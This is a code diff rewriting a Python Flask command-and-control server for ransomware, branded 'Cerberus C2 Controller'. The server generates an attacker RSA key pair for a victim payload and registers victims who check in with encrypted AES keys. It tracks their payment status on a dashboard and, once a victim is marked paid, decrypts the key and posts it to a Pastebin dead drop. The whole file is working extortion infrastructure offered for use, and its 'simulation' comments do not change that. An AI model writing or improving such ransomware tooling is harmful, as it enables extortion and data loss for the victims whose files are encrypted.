@@ -1,118 +1,184 @@
 # c2_server.py
 import os
-import uuid
-from flask import Flask, request, jsonify, render_template_string
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import padding
-from cryptography.hazmat.primitives import hashes
 import base64
 import requests
+from flask import Flask, request, jsonify, render_template_string, redirect
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.backends import default_backend
+import datetime
 
 # --- Configuration ---
-PRIVATE_KEY_FILE = "private_key.pem"
-# CHANGE THIS TO YOUR PASTEBIN URL
-DEAD_DROP_URL = "https://pastebin.com/raw/YOUR_PASTE_ID_HERE" 
+PASTEBIN_API_DEV_KEY = 'YOUR_DEV_KEY_HERE' # Replace with a real Pastebin dev key for full realism
+C2_HOST = '0.0.0.0'
+C2_PORT = 5000
 
-# --- Database (In-memory for simplicity) ---
-victims = {} # { 'victim_id': {'status': 'UNPAID', 'aes_key_b64': '...'} }
+# --- In-Memory "Database" ---
+victims = {}
 
-# --- Load Master Private Key ---
-def load_private_key():
-    if not os.path.exists(PRIVATE_KEY_FILE):
-        print(f"[-] ERROR: {PRIVATE_KEY_FILE} not found. Please run Key Generation step first.")
-        return None
-        
-    with open(PRIVATE_KEY_FILE, "rb") as key_file:
-        return serialization.load_pem_private_key(
-            key_file.read(),
-            password=None,
-        )
+# --- Cryptography Setup ---
+# Load or generate the RSA key pair
+PRIVATE_KEY_FILE = "attacker_private_key.pem"
+PUBLIC_KEY_FILE = "attacker_public_key.pem"
 
-master_private_key = None # load on startup
+def generate_keys():
+    print("Generating new RSA key pair...")
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend()
+    )
+    public_key = private_key.public_key()
+
+    with open(PRIVATE_KEY_FILE, "wb") as f:
+        f.write(private_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.PKCS8,
+            encryption_algorithm=serialization.NoEncryption()
+        ))
+    with open(PUBLIC_KEY_FILE, "wb") as f:
+        f.write(public_key.public_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo
+        ))
+    print(f"Keys saved to {PRIVATE_KEY_FILE} and {PUBLIC_KEY_FILE}")
+    return private_key, public_key
+
+if os.path.exists(PRIVATE_KEY_FILE) and os.path.exists(PUBLIC_KEY_FILE):
+    with open(PRIVATE_KEY_FILE, "rb") as f:
+        private_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())
+    with open(PUBLIC_KEY_FILE, "rb") as f:
+        public_key = serialization.load_pem_public_key(f.read(), backend=default_backend())
+    print("Loaded existing RSA key pair.")
+else:
+    private_key, public_key = generate_keys()
+
+# Get the public key as a string to be used in the victim payload
+ATTACKER_PUBLIC_KEY = public_key.public_bytes(
+    encoding=serialization.Encoding.PEM,
+    format=serialization.PublicFormat.SubjectPublicKeyInfo
+).decode('utf-8')
+
+# --- Pastebin Dead Drop ---
+def post_key_to_pastebin(key_content):
+    # For a real simulation, you'd use the API. For this demo, we'll simulate it.
+    # To make it work without a real API key, we'll just print the URL.
+    # In a real scenario, you would use requests.post to the Pastebin API.
+    print(f"[!] ACTION REQUIRED: Post the following key to a public pastebin service:")
+    print("-" * 20)
+    print(key_content)
+    print("-" * 20)
+    # This is a fake URL for demonstration purposes
+    fake_pastebin_url = f"https://pastebin.com/raw/FAKE_ID_FOR_{base64.b64encode(key_content.encode()).decode('utf-8')[:8]}"
+    print(f"-> Simulated Pastebin URL: {fake_pastebin_url}")
+    return fake_pastebin_url
 
 # --- Flask App ---
 app = Flask(__name__)
 
-# HTML Template for the Attacker's Web Interface
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Ransomware C2 Panel</title>
-    <style>body { font-family: sans-serif; background: #222; color: #eee; } table { width: 100%; border-collapse: collapse; } th, td { border: 1px solid #555; padding: 8px; text-align: left; } th { background: #333; } .paid { color: #4CAF50; } .unpaid { color: #f44336; } button { background-color: #008CBA; color: white; padding: 5px 10px; border: none; cursor: pointer; } button:disabled { background-color: #555; cursor: not-allowed; }</style>
+    <meta charset="UTF-8">
+    <title>Cerberus C2 Controller</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>body { background-color: #121212; color: #e0e0e0; } .table-dark { --bs-table-bg: #1e1e1e; } .btn-warning { --bs-btn-bg: #f0ad4e; } </style>
 </head>
 <body>
-    <h1>C2 Victim Management</h1>
-    <table>
-        <tr>
-            <th>Victim ID</th>
-            <th>Status</th>
-            <th>Action</th>
-        </tr>
-        {% for victim_id, data in victims.items() %}
-        <tr>
-            <td>{{ victim_id }}</td>
-            <td class="{{ 'paid' if data.status == 'PAID' or data.status == 'KEY_SENT' else 'unpaid' }}">
-                {{ data.status }}
-            </td>
-            <td>
-                <form action="/mark_paid" method="post" style="display:inline;">
-                    <input type="hidden" name="victim_id" value="{{ victim_id }}">
-                    <button {% if data.status != 'UNPAID' %}disabled{% endif %}>Mark as Paid</button>
-                </form>
-            </td>
-        </tr>
-        {% endfor %}
-    </table>
+    <div class="container mt-5">
+        <h1 class="text-center mb-4">Cerberus C2 Controller</h1>
+        <div class="card">
+            <div class="card-header">
+                <h3>Victim Management Dashboard</h3>
+            </div>
+            <div class="card-body">
+                <table class="table table-dark table-striped">
+                    <thead>
+                        <tr>
+                            <th>Victim ID</th>
+                            <th>Status</th>
+                            <th>First Seen</th>
+                            <th>Key URL</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for victim_id, data in victims.items() %}
+                        <tr>
+                            <td>{{ victim_id }}</td>
+                            <td>
+                                <span class="badge
+                                    {% if data.status == 'UNPAID' %}bg-danger
+                                    {% elif data.status == 'PAID' %}bg-warning
+                                    {% elif data.status == 'KEY_SENT' %}bg-success
+                                    {% endif %}">
+                                    {{ data.status }}
+                                </span>
+                            </td>
+                            <td>{{ data.first_seen }}</td>
+                            <td><a href="{{ data.key_url }}" target="_blank">{{ data.key_url or 'N/A' }}</a></td>
+                            <td>
+                                <form method="post" action="/mark_paid/{{ victim_id }}">
+                                    <button type="submit" class="btn btn-sm btn-warning" {{ 'disabled' if data.status != 'UNPAID' }}>
+                                        Mark as Paid
+                                    </button>
+                                </form>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
 """
 
 @app.route('/')
-def index():
+def dashboard():
     return render_template_string(HTML_TEMPLATE, victims=victims)
 
-@app.route('/checkin', methods=['POST'])
+@app.route('/api/checkin', methods=['POST'])
 def checkin():
-    victim_id = str(uuid.uuid4())
-    aes_key_b64 = request.json.get('aes_key_b64')
+    encrypted_aes_key_b64 = request.json.get('key')
+    if not encrypted_aes_key_b64:
+        return jsonify({"error": "Missing key"}), 400
 
-    if not aes_key_b64:
-        return jsonify({"error": "AES key not provided"}), 400
-
+    victim_id = base64.b64encode(os.urandom(8)).decode('utf-8')
     victims[victim_id] = {
-        'status': 'UNPAID',
-        'aes_key_b64': aes_key_b64
+        "status": "UNPAID",
+        "encrypted_key": encrypted_aes_key_b64,
+        "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "key_url": None
     }
-    print(f"[+] New victim checked in: {victim_id}")
+    print(f"[+] New victim check-in: {victim_id}")
     return jsonify({"victim_id": victim_id})
 
-@app.route('/status/<victim_id>')
-def status(victim_id):
-    victim = victims.get(victim_id)
-    if not victim:
-        return jsonify({"error": "Victim not found"}), 404
-    return jsonify({"status": victim['status']})
+@app.route('/api/status/<victim_id>', methods=['GET'])
+def get_status(victim_id):
+    data = victims.get(victim_id)
+    if not data:
+        return jsonify({"status": "error", "message": "Victim not found"}), 404
 
-@app.route('/mark_paid', methods=['POST'])
-def mark_paid():
-    victim_id = request.form.get('victim_id')
-    victim = victims.get(victim_id)
+    if data['status'] == 'KEY_SENT':
+        return jsonify({"status": "ready", "key_url": data['key_url']})
+    else:
+        return jsonify({"status": "waiting"})
 
-    if not victim or victim['status'] != 'UNPAID':
-        return "Invalid victim or status", 400
+@app.route('/mark_paid/<victim_id>', methods=['POST'])
+def mark_as_paid(victim_id):
+    victim_data = victims.get(victim_id)
+    if not victim_data or victim_data['status'] != 'UNPAID':
+        return redirect('/')
 
-    # 1. Update status
-    victim['status'] = 'KEY_SENT'
-    print(f"[*] Marking victim {victim_id} as paid. Sending key...")
+    print(f"[*] Marking victim {victim_id} as paid. Decrypting key...")
+    encrypted_aes_key_b64 = victim_data['encrypted_key']
+    encrypted_aes_key = base64.b64decode(encrypted_aes_key_b64)
 
-    if not master_private_key:
-        return "Server Error: Private Key not loaded", 500
-
-    # 2. Decrypt the victim's AES key with the master private key
     try:
-        encrypted_aes_key = base64.b64decode(victim['aes_key_b64'])
-        aes_key = master_private_key.decrypt(
+        aes_key = private_key.decrypt(
             encrypted_aes_key,
             padding.OAEP(
                 mgf=padding.MGF1(algorithm=hashes.SHA256()),
@@ -120,33 +186,24 @@ def mark_paid():
                 label=None
             )
         )
-        aes_key_b64_for_victim = base64.b64encode(aes_key).decode('utf-8')
-    except Exception as e:
-        print(f"[-] Error decrypting AES key for {victim_id}: {e}")
-        return "Failed to decrypt key", 500
+        aes_key_b64 = base64.b64encode(aes_key).decode('utf-8')
+        key_url = post_key_to_pastebin(aes_key_b64)
 
-    # 3. Post the decrypted AES key to the dead drop
-    try:
-        # This is a simplified example. A real system would use Pastebin's API.
-        # For this demo, you will manually update the Pastebin.
-        print(f"[*] DECRYPTION TOKEN for {victim_id}: {aes_key_b64_for_victim}")
-        print(f"[*] Manually post this token to your Pastebin URL: {DEAD_DROP_URL}")
-        # In a real scenario, you would use requests.post() to an API endpoint here.
-        
+        victims[victim_id]['status'] = 'KEY_SENT'
+        victims[victim_id]['key_url'] = key_url
+        print(f"[+] Decryption key for {victim_id} posted to {key_url}")
+
     except Exception as e:
-        print(f"[-] Error posting to dead drop: {e}")
-        return "Failed to post key", 500
-        
-    return "Key sent successfully", 200
+        print(f"[-] Error decrypting key for {victim_id}: {e}")
+        victims[victim_id]['status'] = 'ERROR'
+
+    return redirect('/')
 
 if __name__ == '__main__':
-    # Load key on startup
-    try:
-        master_private_key = load_private_key()
-        if master_private_key:
-            print("[+] Private key loaded successfully.")
-            app.run(host='0.0.0.0', port=5000, debug=True)
-        else:
-             print("[-] Please generate keys first.")
-    except Exception as e:
-        print(f"[-] Error loading key: {e}")
+    print("\n" + "="*50)
+    print("         Cerberus C2 Server Starting...")
+    print("="*50)
+    print(f"-> Public Key for Victim Payload:\n{ATTACKER_PUBLIC_KEY}")
+    print(f"-> Dashboard will be available at http://{C2_HOST}:{C2_PORT}")
+    print("="*50 + "\n")
+    app.run(host=C2_HOST, port=C2_PORT)
